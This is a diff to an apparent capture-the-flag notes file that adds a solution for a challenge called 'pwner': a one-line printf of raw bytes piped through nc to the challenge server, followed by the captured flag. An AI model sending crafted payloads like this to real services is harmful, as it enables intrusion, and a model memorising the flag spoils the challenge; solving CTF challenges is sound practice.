@@ -1,3 +1,12 @@
+# pwner
+-solved
+
+Solution:
+```bash
+(printf "\x45\x49\x04\x84\x05\x84\x23\x02\x99\x32\x03\n") | nc gnsctf.ml 4010
+```
+to get `gnsCTF{r34lly_b1g_k3yb04rd_y0u_g0t_th3r3}`
+
 # shashashasha
 -solved
 
